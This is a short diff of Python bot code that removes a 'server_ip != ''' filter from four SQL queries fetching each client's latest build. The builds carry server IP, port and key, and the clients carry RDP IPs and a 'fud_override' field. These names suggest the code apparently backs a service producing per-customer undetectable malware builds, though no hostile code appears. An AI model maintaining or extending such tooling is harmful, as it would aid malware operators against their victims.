@@ -1597,7 +1597,7 @@ def text_rebuild_confirm(client_id: int, template: str) -> str:
     c  = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
     last_build = db.execute(
         "SELECT build_number, status, server_ip, server_port, server_key FROM builds "
-        "WHERE client_id=? AND template=? AND server_ip != '' "
+        "WHERE client_id=? AND template=? "
         "ORDER BY id DESC LIMIT 1",
         (client_id, template)
     ).fetchone()
@@ -4418,7 +4418,7 @@ def handle_callback(call):
         _c  = _db.execute("SELECT rdp_ip FROM clients WHERE id=?", (client_id,)).fetchone()
         _lb = _db.execute(
             "SELECT server_ip, server_port, server_key FROM builds "
-            "WHERE client_id=? AND template=? AND server_ip != '' "
+            "WHERE client_id=? AND template=? "
             "ORDER BY id DESC LIMIT 1",
             (client_id, template)).fetchone()
         _db.close()
@@ -4740,7 +4740,7 @@ def handle_callback(call):
             _c  = _db.execute("SELECT rdp_ip FROM clients WHERE id=?", (client_id,)).fetchone()
             _lb = _db.execute(
                 "SELECT server_ip, server_port, server_key FROM builds "
-                "WHERE client_id=? AND template=? AND server_ip != '' "
+                "WHERE client_id=? AND template=? "
                 "ORDER BY id DESC LIMIT 1",
                 (client_id, template)).fetchone()
             _db.close()
@@ -4782,7 +4782,7 @@ def handle_callback(call):
             (client_id,)).fetchone()
         _lb = _db.execute(
             "SELECT server_ip, server_port, server_key, fud_override FROM builds "
-            "WHERE client_id=? AND template=? AND server_ip != '' "
+            "WHERE client_id=? AND template=? "
             "ORDER BY id DESC LIMIT 1",
             (client_id, template)).fetchone()
         _db.close()
